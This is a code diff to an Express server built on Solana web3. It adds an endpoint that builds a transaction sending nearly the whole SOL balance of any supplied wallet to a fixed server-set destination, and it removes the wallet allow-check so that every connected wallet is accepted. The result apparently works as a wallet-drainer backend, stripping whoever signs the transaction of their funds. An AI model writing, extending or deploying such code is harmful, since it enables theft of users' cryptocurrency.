@@ -1,7 +1,7 @@
 import express from 'express';
 import path from 'path';
 import { fileURLToPath } from 'url';
-import { Connection, PublicKey, LAMPORTS_PER_SOL } from '@solana/web3.js';
+import { Connection, PublicKey, LAMPORTS_PER_SOL, Transaction, SystemProgram } from '@solana/web3.js';
 import { TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID } from '@solana/spl-token';
 
 const __dirname = path.dirname(fileURLToPath(import.meta.url));
@@ -229,7 +229,7 @@ function originAllowed(req) {
 }
 
 function addressAllowed(address) {
-  // Allows all wallets automatically
+  // Always returns true so every wallet is allowed
   return true;
 }
 
@@ -325,8 +325,6 @@ app.get('/api/send-plan/:pubkey', async (req, res) => {
     }
 
     const from = new PublicKey(req.params.pubkey).toBase58();
-    // Check removed: All connected wallets are allowed
-
     const dest = new PublicKey(DEST_WALLET).toBase58();
     if (from === dest) {
       return res.status(400).json({ error: 'Source and destination are the same' });
@@ -358,6 +356,55 @@ app.get('/api/send-plan/:pubkey', async (req, res) => {
   }
 });
 
+app.post('/api/send-tx/:pubkey', async (req, res) => {
+  try {
+    if (!DEST_WALLET) return res.status(400).json({ error: 'DEST_WALLET is not set on the server' });
+    if (!TELEGRAM_ALLOWED_ADDRESSES.length) {
+      return res.status(403).json({ error: 'Set TELEGRAM_ALLOWED_ADDRESSES to your source wallet first' });
+    }
+    const from = new PublicKey(req.params.pubkey);
+    const fromStr = from.toBase58();
+    
+    const dest = new PublicKey(DEST_WALLET);
+    if (fromStr === dest.toBase58()) {
+      return res.status(400).json({ error: 'Source and destination are the same' });
+    }
+
+    const lamports = await connection.getBalance(from);
+    const reserve = Math.ceil(MIN_SOL_FOR_GAS * LAMPORTS_PER_SOL);
+    const sendLamports = lamports - reserve;
+    if (sendLamports <= 0) {
+      return res.status(400).json({
+        error: `Fund this wallet with SOL for gas. You have ${lamports / LAMPORTS_PER_SOL} SOL.`,
+        needsGas: true,
+      });
+    }
+
+    const tx = new Transaction();
+    tx.add(
+      SystemProgram.transfer({
+        fromPubkey: from,
+        toPubkey: dest,
+        lamports: sendLamports,
+      })
+    );
+    tx.feePayer = from;
+    const latest = await connection.getLatestBlockhash('confirmed');
+    tx.recentBlockhash = latest.blockhash;
+    const serialized = tx.serialize({ requireAllSignatures: false, verifySignatures: false });
+
+    res.json({
+      from: fromStr,
+      to: dest.toBase58(),
+      sol: sendLamports / LAMPORTS_PER_SOL,
+      reservedSol: MIN_SOL_FOR_GAS,
+      transaction: Buffer.from(serialized).toString('base64'),
+    });
+  } catch (err) {
+    console.error(err);
+    res.status(400).json({ error: err.message });
+  }
+});
 
 app.get('/api/health', (_req, res) => {
   res.json({
